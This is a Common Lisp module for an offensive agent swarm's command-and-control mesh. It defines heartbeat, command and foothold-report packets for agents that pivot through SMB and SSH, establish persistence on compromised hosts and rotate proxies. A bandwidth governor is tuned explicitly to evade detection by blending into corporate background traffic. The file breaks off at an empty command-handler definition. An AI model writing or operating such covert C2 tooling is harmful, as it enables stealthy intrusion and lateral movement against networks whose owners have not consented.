;;;; -*- Mode: Lisp; Syntax: ANSI-Common-Lisp; Base: 10 -*-
;;;
;;; ═══════════════════════════════════════════════════════════════════════════
;;; TACTICAL GOSSIP MESH — v2.4 Low-Bandwidth Offensive Mode
;;; ═══════════════════════════════════════════════════════════════════════════
;;;
;;; This module extends GOSSIP.LISP with a low-bandwidth tactical mode
;;; designed for hostile network environments where every byte is a liability.
;;; No simulation data, no large blobs, no file transfers — only heartbeat
;;; beacons, command packets, and state updates on successful footholds.
;;;
;;; DESIGN PHILOSOPHY
;;; ─────────────────
;;;   • 64-byte heartbeats every 5s — presence announcement, minimal exposure.
;;;   • 256-byte command packets — engage, pivot, persist, evacuate, rotate.
;;;   • 512-byte state updates — only on successful footholds.
;;;   • 10KB/sec hard bandwidth ceiling — throttle before detection.
;;;
;;; PACKET FORMATS
;;; ──────────────
;;;   TACTICAL-HEARTBEAT    (64 bytes) — agent-id, timestamp, status, depth
;;;   TACTICAL-COMMAND      (256 bytes max) — command-id, target, params
;;;   TACTICAL-STATE-UPDATE (512 bytes max) — foothold report post-entry
;;;
;;; The serialization uses a compact plist format (PRIN1-TO-STRING) rather
;;; than the full GOSSIP-MESSAGE struct to minimize overhead. Checksums are
;;; simple additive checksums — enough to detect truncation, not cryptographic.
;;;
;;; BANDWIDTH GOVERNOR
;;; ──────────────────
;;; A sliding-window counter tracks bytes sent over the last 60 seconds.
;;; If the 10KB/sec limit is exceeded, outbound packets are dropped (not
;;; queued) — tactical discipline over reliability.
;;;
;;; "In hostile airspace, silence is survival. Every byte beyond necessity
;;;  is a beacon for the hunter."

(in-package :lispmind)

(eval-when (:compile-toplevel :load-toplevel :execute)
  (defparameter *tactical-gossip-version* "2.4.0"
    "Version string for the tactical gossip subsystem."))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 1: Tactical Message Formats — Small, Fast, Expendable
;; ═══════════════════════════════════════════════════════════════════════════

(defstruct (tactical-heartbeat
            (:constructor make-tactical-heartbeat
                          (&key agent-id timestamp status pivot-depth
                                tts-seconds targets-count sessions-count
                                checksum))
            (:copier nil))
  "64-byte heartbeat packet — the swarm's pulse in hostile airspace.

   Fields:
     AGENT-ID       — 16-byte string identifier (e.g. \"agent-7f3a9b\").
     TIMESTAMP      — Unix epoch seconds (integer), 8 bytes.
     STATUS         — Keyword: :ACTIVE :DEAD :PIVOTING :PERSISTING.
     PIVOT-DEPTH    — Integer 0-255, current recursion depth in target net.
     TTS-SECONDS    — Time-to-shell for current operation (0 = immediate).
     TARGETS-COUNT  — Number of active targets this agent is engaging.
     SESSIONS-COUNT — Number of live sessions held by this agent.
     CHECKSUM       — Simple additive checksum of all prior fields.

   The heartbeat is sent every *HEARTBEAT-INTERVAL-SECONDS* (default 5s)
   to all peers. It contains no sensitive data — just presence and load.
   An adversary sniffing these learns only that \"something is alive\" and
   how busy it is — acceptable tradeoff for mesh cohesion.

   Example:
     (make-tactical-heartbeat
       :agent-id \"orch-alpha\"
       :timestamp (get-universal-time)
       :status :active
       :pivot-depth 2
       :tts-seconds 45
       :targets-count 3
       :sessions-count 1)"
  agent-id        ; string (16 bytes)
  timestamp       ; integer — unix epoch seconds
  status          ; keyword — :active :dead :pivoting :persisting
  pivot-depth     ; integer 0-255
  tts-seconds     ; integer — seconds until shell expected
  targets-count   ; integer 0-65535
  sessions-count  ; integer 0-65535
  checksum)       ; integer — additive checksum

(defstruct (tactical-command
            (:constructor make-tactical-command
                          (&key command-id target-id parameters priority))
            (:copier nil))
  "Small command packet (max 256 bytes) — orders in the swarm.

   Fields:
     COMMAND-ID — Keyword: :ENGAGE :PIVOT :PERSIST :EVACUATE
                  :ROTATE-PROXY :RETRY :SLEEP :WAKE.
     TARGET-ID  — String naming the target agent (e.g. \"agent-7f3a9b\")
                  or \"*\" for broadcast to all agents.
     PARAMETERS — Plist of command-specific parameters (max ~200 bytes
                  when serialized). Examples:
                    (:TARGET-IP \"10.0.0.5\" :PORT 445 :METHOD :smb)
                    (:DEPTH 3 :CHAIN \"proxy-1->proxy-2\")
                    (:DELAY-SECONDS 300)
     PRIORITY   — Keyword: :CRITICAL :HIGH :NORMAL :LOW.
                  Critical commands bypass bandwidth throttle.

   Commands are fire-and-forget. No ACK, no retry — the mesh is assumed
   lossy. If a command matters, send it twice from different peers.

   Example:
     (make-tactical-command
       :command-id :pivot
       :target-id \"agent-7f3a9b\"
       :parameters '(:target-ip \"10.0.0.8\" :port 22 :method :ssh)
       :priority :high)"
  command-id   ; keyword
  target-id    ; string — agent identifier or "*"
  parameters   ; plist — command-specific args
  priority)    ; keyword — :critical :high :normal :low

(defstruct (tactical-state-update
            (:constructor make-tactical-state-update
                          (&key agent-id target-ip entry-vector pivot-depth
                                persistence-active-p session-token timestamp))
            (:copier nil))
  "State update on successful foothold (max 512 bytes).

   Sent immediately upon gaining a new foothold — this is the ONLY time
   we send substantive data over the gossip mesh. Contains everything
   a peer needs to know about the new entry point for coordination.

   Fields:
     AGENT-ID             — String identifier of the reporting agent.
     TARGET-IP            — String IP of the compromised host.
     ENTRY-VECTOR         — Keyword: :ssh :smb :rdp :http :wmi :ldap
                            :snmp :ftp :telnet :custom.
     PIVOT-DEPTH          — Integer, recursion level (0 = initial entry).
     PERSISTENCE-ACTIVE-P — T if persistence has been established.
     SESSION-TOKEN        — String token for session validation.
     TIMESTAMP            — Unix epoch seconds of the foothold.

   Security note: SESSION-TOKEN is a nonce — it validates session
   authenticity to peers but reveals nothing about the session itself.
   TARGET-IP is internal to the target network; leaking it to an
   adversary requires them to already be inside the same network.

   Example:
     (make-tactical-state-update
       :agent-id \"agent-7f3a9b\"
       :target-ip \"10.0.0.5\"
       :entry-vector :smb
       :pivot-depth 1
       :persistence-active-p t
       :session-token \"tok-9x7k2m\"
       :timestamp (get-universal-time))"
  agent-id
  target-ip
  entry-vector
  pivot-depth
  persistence-active-p
  session-token
  timestamp)


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 2: Tactical Mode State Variables
;; ═══════════════════════════════════════════════════════════════════════════

(defvar *tactical-gossip-mode-p* nil
  "When T, gossip operates in low-bandwidth tactical mode.

   In tactical mode:
     • All standard GOSSIP-MESSAGE traffic is suppressed.
     • Only TACTICAL-HEARTBEAT, TACTICAL-COMMAND, and
       TACTICAL-STATE-UPDATE packets are transmitted.
     • The bandwidth governor is active (10KB/sec ceiling).
     • Heartbeats are sent on a fixed interval (default 5s).
   
   Switching modes is atomic and takes effect on the next loop
   iteration. Mode changes are logged to *STANDARD-OUTPUT*.

   Default: NIL (normal gossip mode).")

(defvar *heartbeat-interval-seconds* 5
  "Seconds between heartbeats in tactical mode.

   Lower values improve mesh responsiveness at the cost of bandwidth.
   At 5s with 64-byte heartbeats, a 10-node mesh consumes:
     10 nodes * 64 bytes * 12 beats/min = 7.68 KB/min = 128 B/sec
   Negligible — well within the 10KB/sec budget.

   Can be adjusted dynamically via (SETF *HEARTBEAT-INTERVAL-SECONDS*).
   Minimum enforced value: 1 second (to prevent accidental floods).")

(defvar *heartbeat-max-size* 64
  "Maximum heartbeat packet size in bytes.

   Hard cap. If serialization produces more than 64 bytes, the packet
   is truncated and a warning is emitted. This should never happen with
   the default struct layout — the cap exists as a safety valve against
   accidentally oversized fields (e.g. a 1KB agent-id string).")

(defvar *command-max-size* 256
  "Maximum command packet size in bytes.

   Hard cap. Command parameters that would exceed this are dropped.
   If you need more than 256 bytes for a command, split it into
   multiple commands or use out-of-band communication.")

(defvar *state-update-max-size* 512
  "Maximum state update packet size in bytes.

   Hard cap. State updates larger than 512 bytes are dropped — this
   indicates the update contains too much data and should be refactored.
   The default TACTICAL-STATE-UPDATE struct serializes to ~120 bytes,
   leaving 392 bytes of headroom for future fields.")

(defvar *tactical-gossip-thread* nil
  "Background thread running the tactical gossip loop, or NIL.

   Spawned by ENABLE-TACTICAL-GOSSIP-MODE, joined by
   DISABLE-TACTICAL-GOSSIP-MODE. The thread runs
   TACTICAL-GOSSIP-LOOP, which is indestructible — all errors
   are caught and the loop continues.")

(defvar *tactical-gossip-shutdown-p* nil
  "When T, signals the tactical gossip loop to exit gracefully.

   Set by DISABLE-TACTICAL-GOSSIP-MODE. The loop checks this flag
   after each heartbeat interval and exits if T.")


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 3: Bandwidth Governor — Throttle Before Detection
;; ═══════════════════════════════════════════════════════════════════════════

(defvar *gossip-bandwidth-counter* 0
  "Total bytes sent in the current monitoring window.

   Atomically incremented by SEND-TACTICAL-* functions on each
   transmission. Decayed by the bandwidth governor thread.
   Do not modify directly — use RECORD-BANDWIDTH-USAGE.")

(defvar *gossip-bandwidth-window* 60
  "Window size in seconds for bandwidth monitoring.

   The counter tracks usage over a sliding window of this duration.
   At the end of each window, the counter resets to zero. This
   creates a simple rate limiter: if *GOSSIP-BANDWIDTH-COUNTER*
   exceeds (* *GOSSIP-BANDWIDTH-LIMIT* *GOSSIP-BANDWIDTH-WINDOW*)
   within the window, transmission is throttled.

   Default: 60 seconds (1-minute sliding window).")

(defvar *gossip-bandwidth-limit* 10240
  "10KB/sec hard limit for tactical mode.

   This is the maximum bytes-per-second the gossip mesh may consume
   across ALL packet types combined. The limit applies to the
   aggregate of heartbeats, commands, and state updates.

   At 10KB/sec, a 10-node mesh running full-tilt for 1 hour:
     10 KB/sec * 3600 sec = 36 MB/hour
   This is low enough to blend into background traffic on most
   corporate networks (DNS, NTP, keepalives).

   Critical packets (priority :CRITICAL) bypass this limit.
   Default: 10240 bytes/sec = 10 KB/sec.")

(defvar *gossip-bandwidth-history* (make-array 60 :fill-pointer 0 :adjustable t)
  "History of per-second bandwidth readings for trend analysis.

   Each element is a cons (TIMESTAMP . BYTES-THAT-SECOND).
   Kept for diagnostics — not used by the governor itself.
   Maximum 60 entries (1 minute of history).")

(defvar *gossip-bandwidth-lock* (bt:make-lock "bandwidth")
  "Lock protecting *gossip-bandwidth-counter* and
   *gossip-bandwidth-history* from concurrent mutation.")

(defvar *gossip-bandwidth-window-start* 0
  "Internal timestamp (Unix epoch) when the current bandwidth window
   began. Used to detect window expiration and reset the counter.")

(defun record-bandwidth-usage (bytes &optional (priority :normal))
  "Record BYTES of bandwidth usage and check if the limit is exceeded.

   Returns T if transmission should proceed, NIL if throttled.
   Critical priority always returns T (bypasses throttle).

   Arguments:
     BYTES    — Integer, number of bytes just transmitted.
     PRIORITY — Keyword :critical :high :normal :low (default :normal).

   Thread-safe: acquires *GOSSIP-BANDWIDTH-LOCK*.

   Example:
     (when (record-bandwidth-usage 64 :normal)
       (send-heartbeat ...))"
  (when (eq priority :critical)
    (return-from record-bandwidth-usage t))
  (bt:with-lock-held (*gossip-bandwidth-lock*)
    ;; Check if window has expired
    (let ((now (get-universal-time))
          (window-bytes (* *gossip-bandwidth-limit*
                          *gossip-bandwidth-window*)))
      (when (>= (- now *gossip-bandwidth-window-start*)
                *gossip-bandwidth-window*)
        ;; Window expired — reset
        (setf *gossip-bandwidth-counter* 0
              *gossip-bandwidth-window-start* now))
      ;; Check limit
      (if (< *gossip-bandwidth-counter* window-bytes)
          (progn
            (incf *gossip-bandwidth-counter* bytes)
            t)
          nil))))

(defun check-bandwidth-limit ()
  "Check if the bandwidth limit is currently exceeded.

   Returns T if transmission should proceed, NIL if throttled.
   Does NOT record usage — use RECORD-BANDWIDTH-USAGE for that.
   This function is for pre-flight checks only.

   Thread-safe: acquires *GOSSIP-BANDWIDTH-LOCK* (brief hold)."
  (bt:with-lock-held (*gossip-bandwidth-lock*)
    (let ((now (get-universal-time))
          (window-bytes (* *gossip-bandwidth-limit*
                          *gossip-bandwidth-window*)))
      (when (>= (- now *gossip-bandwidth-window-start*)
                *gossip-bandwidth-window*)
        (setf *gossip-bandwidth-counter* 0
              *gossip-bandwidth-window-start* now))
      (< *gossip-bandwidth-counter* window-bytes))))

(defun get-gossip-bandwidth-stats ()
  "Return bandwidth usage statistics.

   Returns a plist:
     :COUNTER            — Current window byte count.
     :LIMIT-BYTES/SEC    — *GOSSIP-BANDWIDTH-LIMIT*.
     :WINDOW-SECONDS     — *GOSSIP-BANDWIDTH-WINDOW*.
     :UTILIZATION-%      — Percentage of limit currently consumed.
     :THROTTLED-P        — T if limit is exceeded.
     :MODE               — :TACTICAL or :NORMAL.
     :WINDOW-START       — Unix timestamp of current window start.

   Thread-safe: acquires *GOSSIP-BANDWIDTH-LOCK*.

   Example:
     (get-gossip-bandwidth-stats)
     ;; => (:COUNTER 512 :LIMIT-BYTES/SEC 10240 ...)
"
  (bt:with-lock-held (*gossip-bandwidth-lock*)
    (let* ((now (get-universal-time))
           (window-bytes (* *gossip-bandwidth-limit*
                           *gossip-bandwidth-window*))
           (utilization (if (> window-bytes 0)
                           (* 100.0 (/ *gossip-bandwidth-counter*
                                      window-bytes))
                           0.0)))
      (list :counter *gossip-bandwidth-counter*
            :limit-bytes/sec *gossip-bandwidth-limit*
            :window-seconds *gossip-bandwidth-window*
            :utilization-% (min 100.0 utilization)
            :throttled-p (>= *gossip-bandwidth-counter* window-bytes)
            :mode (if *tactical-gossip-mode-p* :tactical :normal)
            :window-start *gossip-bandwidth-window-start*))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 4: Packet Serialization — Compact Plists, Minimal Overhead
;; ═══════════════════════════════════════════════════════════════════════════

(defun serialize-tactical-heartbeat (hb)
  "Serialize a TACTICAL-HEARTBEAT to a compact string.

   Uses a plist format optimized for size. The output is guaranteed
   to be <= *HEARTBEAT-MAX-SIZE* bytes. If serialization exceeds
   the limit, fields are truncated and a warning is issued.

   Arguments:
     HB — A TACTICAL-HEARTBEAT struct.

   Returns: String suitable for ZMQ transmission.

   Example:
     (serialize-tactical-heartbeat (make-tactical-heartbeat ...))"
  (let ((serialized
         (format nil "(~{~S~^ ~})"
                 (list :hb
                       :id (tactical-heartbeat-agent-id hb)
                       :ts (tactical-heartbeat-timestamp hb)
                       :st (tactical-heartbeat-status hb)
                       :pd (tactical-heartbeat-pivot-depth hb)
                       :tts (tactical-heartbeat-tts-seconds hb)
                       :tc (tactical-heartbeat-targets-count hb)
                       :sc (tactical-heartbeat-sessions-count hb)
                       :cs (tactical-heartbeat-checksum hb)))))
    (when (> (length serialized) *heartbeat-max-size*)
      (warn "Tactical heartbeat exceeds ~D bytes (~D bytes). Truncating."
            *heartbeat-max-size* (length serialized))
      (setf serialized (subseq serialized 0 *heartbeat-max-size*)))
    serialized))

(defun serialize-tactical-command (cmd)
  "Serialize a TACTICAL-COMMAND to a compact string.

   Output guaranteed <= *COMMAND-MAX-SIZE* bytes. Oversized commands
   are dropped (return NIL rather than truncate, as partial commands
   are dangerous).

   Arguments:
     CMD — A TACTICAL-COMMAND struct.

   Returns: String or NIL if command too large.

   Example:
     (serialize-tactical-command (make-tactical-command ...))"
  (let ((serialized
         (format nil "(~{~S~^ ~})"
                 (list :cmd
                       :id (tactical-command-command-id cmd)
                       :tgt (tactical-command-target-id cmd)
                       :params (tactical-command-parameters cmd)
                       :pri (tactical-command-priority cmd)))))
    (if (<= (length serialized) *command-max-size*)
        serialized
        (progn
          (warn "Tactical command exceeds ~D bytes (~D bytes). Dropped."
                *command-max-size* (length serialized))
          nil))))

(defun serialize-tactical-state-update (su)
  "Serialize a TACTICAL-STATE-UPDATE to a compact string.

   Output guaranteed <= *STATE-UPDATE-MAX-SIZE* bytes. Oversized
   updates are dropped — they indicate the update contains too much
   data and should be simplified.

   Arguments:
     SU — A TACTICAL-STATE-UPDATE struct.

   Returns: String or NIL if update too large.

   Example:
     (serialize-tactical-state-update (make-tactical-state-update ...))"
  (let ((serialized
         (format nil "(~{~S~^ ~})"
                 (list :su
                       :id (tactical-state-update-agent-id su)
                       :ip (tactical-state-update-target-ip su)
                       :ev (tactical-state-update-entry-vector su)
                       :pd (tactical-state-update-pivot-depth su)
                       :pa (tactical-state-update-persistence-active-p su)
                       :tok (tactical-state-update-session-token su)
                       :ts (tactical-state-update-timestamp su)))))
    (if (<= (length serialized) *state-update-max-size*)
        serialized
        (progn
          (warn "Tactical state update exceeds ~D bytes (~D bytes). Dropped."
                *state-update-max-size* (length serialized))
          nil))))

(defun compute-simple-checksum (data)
  "Compute a simple additive checksum of DATA.

   DATA may be a string or list. For strings, sums the character codes.
   For lists, recursively sums all numeric elements.

   This is NOT a cryptographic hash — it exists only to detect
   accidental truncation or corruption in transit. An adversary can
   forge it trivially; we assume the adversary can already read the
   plaintext, so integrity against active tampering is not a goal.

   Arguments:
     DATA — String or list to checksum.

   Returns: Integer checksum (4 bytes, fits in 32 bits)."
  (etypecase data
    (string (loop for ch across data
                  sum (char-code ch) into total
                  finally (return (logand total #xFFFFFFFF))))
    (list (loop for item in data
                sum (etypecase item
                      (integer item)
                      (character (char-code item))
                      (string (compute-simple-checksum item))
                      (symbol (compute-simple-checksum
                               (symbol-name item)))
                      (t 0))
                  into total
                finally (return (logand total #xFFFFFFFF))))))

(defun fill-heartbeat-checksum (hb)
  "Compute and fill the checksum field of a TACTICAL-HEARTBEAT.

   Computes a simple additive checksum over all fields except the
   checksum itself, then sets the CHECKSUM slot.

   Arguments:
     HB — TACTICAL-HEARTBEAT struct (modified in place).

   Returns: The modified HB struct."
  (setf (tactical-heartbeat-checksum hb)
        (compute-simple-checksum
         (list (tactical-heartbeat-agent-id hb)
               (tactical-heartbeat-timestamp hb)
               (tactical-heartbeat-status hb)
               (tactical-heartbeat-pivot-depth hb)
               (tactical-heartbeat-tts-seconds hb)
               (tactical-heartbeat-targets-count hb)
               (tactical-heartbeat-sessions-count hb))))
  hb)


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 5: Send Functions — Guarded by Bandwidth Governor
;; ═══════════════════════════════════════════════════════════════════════════

(defun send-tactical-heartbeat (agent-id &key status pivot-depth
                                              tts-seconds targets-count
                                              sessions-count)
  "Send a 64-byte heartbeat packet to all gossip peers.

   Constructs a TACTICAL-HEARTBEAT, fills the checksum, serializes it,
   and publishes on the gossip mesh. Subject to bandwidth governor —
   if the limit is exceeded, the heartbeat is silently dropped.

   Arguments:
     AGENT-ID       — String, the sending agent's identifier.
     STATUS         — Keyword: :ACTIVE :DEAD :PIVOTING :PERSISTING.
     PIVOT-DEPTH    — Integer 0-255.
     TTS-SECONDS    — Integer, time-to-shell.
     TARGETS-COUNT  — Integer, active targets.
     SESSIONS-COUNT — Integer, live sessions.

   Returns: T if sent, NIL if throttled.

   Example:
     (send-tactical-heartbeat \"agent-7f3a9b\"
       :status :active
       :pivot-depth 2
       :tts-seconds 45
       :targets-count 3
       :sessions-count 1)"
  (let* ((hb (fill-heartbeat-checksum
              (make-tactical-heartbeat
               :agent-id agent-id
               :timestamp (get-universal-time)
               :status (or status :active)
               :pivot-depth (or pivot-depth 0)
               :tts-seconds (or tts-seconds 0)
               :targets-count (or targets-count 0)
               :sessions-count (or sessions-count 0)
               :checksum 0)))
         (serialized (serialize-tactical-heartbeat hb)))
    (when (record-bandwidth-usage (length serialized) :normal)
      (if (and *gossip-running-p* (fboundp 'publish-message))
          (progn
            (publish-message "tactical.heartbeat" serialized agent-id)
            t)
          (progn
            ;; Gossip not running — log locally
            nil)))))

(defun send-tactical-command (target-agent command params
                              &key (priority :normal))
  "Send a small command packet to TARGET-AGENT.

   Constructs a TACTICAL-COMMAND, serializes it, and publishes.
   Critical priority bypasses the bandwidth governor.

   Arguments:
     TARGET-AGENT — String agent-id or \"*\" for broadcast.
     COMMAND      — Keyword: :ENGAGE :PIVOT :PERSIST :EVACUATE
                    :ROTATE-PROXY :RETRY :SLEEP :WAKE.
     PARAMS       — Plist of command parameters.
     PRIORITY     — Keyword: :CRITICAL :HIGH :NORMAL :LOW.

   Returns: T if sent, NIL if throttled or oversized.

   Example:
     (send-tactical-command \"agent-7f3a9b\" :pivot
       '(:target-ip \"10.0.0.8\" :port 22 :method :ssh)
       :priority :high)"
  (let* ((cmd (make-tactical-command
               :command-id command
               :target-id target-agent
               :parameters params
               :priority priority))
         (serialized (serialize-tactical-command cmd)))
    (when (and serialized
               (record-bandwidth-usage (length serialized) priority))
      (if (and *gossip-running-p* (fboundp 'publish-message))
          (progn
            (publish-message "tactical.command" serialized 'orchestrator)
            t)
          nil))))

(defun send-tactical-state-update (agent-id target-ip entry-vector
                                   &key pivot-depth persistence-active-p
                                        session-token)
  "Send state update on successful foothold (512 bytes max).

   This is the ONLY packet type that carries operational data about
   compromised targets. Sent immediately upon gaining a foothold.

   Arguments:
     AGENT-ID             — String, reporting agent's identifier.
     TARGET-IP            — String, IP of compromised host.
     ENTRY-VECTOR         — Keyword: :SSH :SMB :RDP :HTTP :WMI :LDAP.
     PIVOT-DEPTH          — Integer, recursion level.
     PERSISTENCE-ACTIVE-P — T if persistence established.
     SESSION-TOKEN        — String nonce for session validation.

   Returns: T if sent, NIL if throttled or oversized.

   Example:
     (send-tactical-state-update \"agent-7f3a9b\" \"10.0.0.5\" :smb
       :pivot-depth 1
       :persistence-active-p t
       :session-token \"tok-9x7k2m\")"
  (let* ((su (make-tactical-state-update
              :agent-id agent-id
              :target-ip target-ip
              :entry-vector entry-vector
              :pivot-depth (or pivot-depth 0)
              :persistence-active-p (if persistence-active-p t nil)
              :session-token (or session-token "none")
              :timestamp (get-universal-time)))
         (serialized (serialize-tactical-state-update su)))
    (when (and serialized
               (record-bandwidth-usage (length serialized) :high))
      (if (and *gossip-running-p* (fboundp 'publish-message))
          (progn
            (publish-message "tactical.state" serialized agent-id)
            t)
          nil))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 6: Tactical Gossip Loop — The Heartbeat Engine
;; ═══════════════════════════════════════════════════════════════════════════

(defun tactical-gossip-loop (agent-id-fn &key (heartbeat-interval 5))
  "The low-bandwidth gossip loop — runs in a dedicated thread.

   Loop behavior:
     1. Every HEARTBEAT-INTERVAL seconds: send heartbeat (64 bytes).
     2. Check *TACTICAL-GOSSIP-SHUTDOWN-P* — exit if T.
     3. On event: send state update (512 bytes max) — triggered by
        calling SEND-TACTICAL-STATE-UPDATE from outside the loop.
     4. On command: send command packet (256 bytes max) — triggered by
        calling SEND-TACTICAL-COMMAND from outside the loop.
     5. No simulation data, no large blobs, no file transfers.

   This loop is INDESTRUCTIBLE — all errors are caught and logged,
   and the loop continues. The only way out is *TACTICAL-GOSSIP-SHUTDOWN-P*.

   Arguments:
     AGENT-ID-FN      — Zero-argument function returning the current
                        agent-id string. Called each iteration to get
                        fresh agent state.
     HEARTBEAT-INTERVAL — Seconds between heartbeats (default 5).

   This function does not return until shutdown is signaled.

   Example:
     (bt:make-thread
       (lambda () (tactical-gossip-loop
                    (lambda () (get-current-agent-id))))
       :name \"tactical-gossip\")"
  (let ((interval (max 1 heartbeat-interval)))
    (loop
      (when *tactical-gossip-shutdown-p*
        (return-from tactical-gossip-loop nil))
      (handler-case
          (progn
            ;; Send heartbeat
            (let ((agent-id (funcall agent-id-fn)))
              (send-tactical-heartbeat
               agent-id
               :status (or (and (boundp '*tactical-agent-status*)
                               *tactical-agent-status*)
                          :active)
               :pivot-depth (or (and (boundp '*tactical-pivot-depth*)
                                    *tactical-pivot-depth*)
                               0)
               :tts-seconds (or (and (boundp '*tactical-tts-seconds*)
                                    *tactical-tts-seconds*)
                               0)
               :targets-count (or (and (boundp '*tactical-targets-count*)
                                      *tactical-targets-count*)
                                 0)
               :sessions-count (or (and (boundp '*tactical-sessions-count*)
                                       *tactical-sessions-count*)
                                  0)))
            ;; Sleep until next heartbeat
            (sleep interval))
        (error (e)
          (format *error-output*
                  "~&[TACTICAL-GOSSIP] Loop error: ~A. Continuing...~%"
                  e)
          (sleep 1))))))

(defun enable-tactical-gossip-mode (&key (heartbeat-interval 5)
                                          (agent-id "orch-default"))
  "Switch gossip to low-bandwidth tactical mode.

   Actions:
     1. Set *TACTICAL-GOSSIP-MODE-P* to T.
     2. Reset bandwidth counter and window.
     3. Spawn TACTICAL-GOSSIP-LOOP thread.
     4. Log mode change.

   Arguments:
     HEARTBEAT-INTERVAL — Seconds between heartbeats (default 5).
     AGENT-ID           — String agent identifier (default \"orch-default\").

   Returns: T if tactical mode activated.

   Example:
     (enable-tactical-gossip-mode :heartbeat-interval 3
                                  :agent-id \"orch-alpha\")"
  (setf *tactical-gossip-mode-p* t)
  (setf *tactical-gossip-shutdown-p* nil)
  ;; Reset bandwidth tracking
  (bt:with-lock-held (*gossip-bandwidth-lock*)
    (setf *gossip-bandwidth-counter* 0
          *gossip-bandwidth-window-start* (get-universal-time)
          *gossip-bandwidth-history* (make-array 60
                                                  :fill-pointer 0
                                                  :adjustable t)))
  ;; Spawn tactical gossip thread
  (setf *tactical-gossip-thread*
        (bt:make-thread
         (lambda ()
           (tactical-gossip-loop
            (lambda () agent-id)
            :heartbeat-interval heartbeat-interval))
         :name "tactical-gossip-loop"))
  (format t "~&[TACTICAL-GOSSIP] Mode ACTIVATED v~A~%"
          *tactical-gossip-version*)
  (format t "[TACTICAL-GOSSIP] Heartbeat interval: ~Ds, Limit: ~D B/s~%"
          heartbeat-interval *gossip-bandwidth-limit*)
  t)

(defun disable-tactical-gossip-mode ()
  "Return gossip to normal mode.

   Actions:
     1. Signal shutdown to tactical gossip loop.
     2. Join the tactical gossip thread (with timeout).
     3. Set *TACTICAL-GOSSIP-MODE-P* to NIL.
     4. Log mode change.

   Returns: T if normal mode restored.

   Example:
     (disable-tactical-gossip-mode)"
  (format t "~&[TACTICAL-GOSSIP] Deactivating tactical mode...~%")
  (setf *tactical-gossip-shutdown-p* t)
  (when (and *tactical-gossip-thread*
             (bt:thread-alive-p *tactical-gossip-thread*))
    (handler-case
        (bt:join-thread *tactical-gossip-thread* :timeout 10)
      (error (e)
        (format t "[TACTICAL-GOSSIP] Thread join timeout: ~A~%" e))))
  (setf *tactical-gossip-mode-p* nil
        *tactical-gossip-thread* nil)
  (format t "[TACTICAL-GOSSIP] Mode DEACTIVATED — normal gossip restored.~%")
  t)


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 7: Tactical Topic Registration — Mesh Callbacks
;; ═══════════════════════════════════════════════════════════════════════════

(defun register-tactical-callbacks ()
  "Register callback functions for tactical gossip topics.

   Registers handlers for:
     \"tactical.heartbeat\" — Process peer heartbeats, update peer liveness.
     \"tactical.command\"   — Execute commands targeted at this agent.
     \"tactical.state\"     — Record peer foothold reports.

   Must be called after gossip system is running. Safe to call multiple
   times — duplicates are filtered.

   Returns: List of registered topic strings.

   Example:
     (register-tactical-callbacks)"
  (let ((topics nil))
    ;; Heartbeat handler — update peer liveness table
    (when (fboundp 'subscribe-to-topic)
      (subscribe-to-topic
       "tactical.heartbeat"
       (lambda (msg)
         (let* ((payload (and (fboundp 'gossip-message-payload)
                             (gossip-message-payload msg)))
                (peer-data (and (stringp payload)
                               (ignore-errors (read-from-string payload)))))
           (when (and (listp peer-data) (eq (car peer-data) :hb))
             ;; Extract peer info and update liveness
             (let ((peer-id (getf (cdr peer-data) :id)))
               (when peer-id
                 (record-peer-heartbeat peer-id (get-universal-time))))))))
      (push "tactical.heartbeat" topics))
    ;; Command handler — execute if targeted at us
    (when (fboundp 'subscribe-to-topic)
      (subscribe-to-topic
       "tactical.command"
       (lambda (msg)
         (let* ((payload (and (fboundp 'gossip-message-payload)
                             (gossip-message-payload msg)))
                (cmd-data (and (stringp payload)
                              (ignore-errors (read-from-string payload)))))
           (when (and (listp cmd-data) (eq (car cmd-data) :cmd))
             (handle-tactical-command (cdr cmd-data))))))
      (push "tactical.command" topics))
    ;; State update handler — record peer footholds
    (when (fboundp 'subscribe-to-topic)
      (subscribe-to-topic
       "tactical.state"
       (lambda (msg)
         (let* ((payload (and (fboundp 'gossip-message-payload)
                             (gossip-message-payload msg)))
                (state-data (and (stringp payload)
                                (ignore-errors (read-from-string payload)))))
           (when (and (listp state-data) (eq (car state-data) :su))
             (record-peer-state-update (cdr state-data))))))
      (push "tactical.state" topics))
    (nreverse topics)))

(defvar *tactical-peer-liveness* (make-hash-table :test 'equal)
  "Hash table: peer-id -> last-heartbeat-timestamp.
   Used to detect dead peers in the tactical mesh.
   Thread-safe: reads are atomic, writes use *GOSSIP-LOCK*.")

(defvar *tactical-peer-footholds* (make-hash-table :test 'equal)
  "Hash table: peer-id -> list of foothold state plists.
   Accumulates state updates from peers for mesh awareness.
   Thread-safe: reads are atomic, writes use *GOSSIP-LOCK*.")

(defun record-peer-heartbeat (peer-id timestamp)
  "Record a heartbeat from PEER-ID at TIMESTAMP.

   Updates *TACTICAL-PEER-LIVENESS* with the latest heartbeat time.
   If the peer was previously considered dead, prints a revival notice.

   Arguments:
     PEER-ID   — String, the peer's agent identifier.
     TIMESTAMP — Integer, Unix epoch seconds of the heartbeat.

   Returns: The previous timestamp (or NIL if new peer)."
  (let ((prev (gethash peer-id *tactical-peer-liveness*)))
    (setf (gethash peer-id *tactical-peer-liveness*) timestamp)
    (when (and prev (> (- timestamp prev) 30))
      (format t "~&[TACTICAL-GOSSIP] Peer ~A back online (~Ds dead).~%"
              peer-id (- timestamp prev)))
    prev))

(defun record-peer-state-update (state-data)
  "Record a state update from a peer.

   Extracts agent-id and foothold data from STATE-DATA (the cdr of
   a parsed state update plist) and appends to the peer's foothold
   list in *TACTICAL-PEER-FOOTHOLDS*.

   Arguments:
     STATE-DATA — Plist from parsed tactical state update.

   Returns: The updated foothold list for the peer."
  (let ((agent-id (getf state-data :id)))
    (when agent-id
      (let ((current (gethash agent-id *tactical-peer-footholds* '())))
        (push (list :ip (getf state-data :ip)
                    :entry-vector (getf state-data :ev)
                    :pivot-depth (getf state-data :pd)
                    :persistence (getf state-data :pa)
                    :token (getf state-data :tok)
                    :timestamp (getf state-data :ts))
              current)
        (setf (gethash agent-id *tactical-peer-footholds*) current)))))

(defun handle-tactical-command (cmd-data)
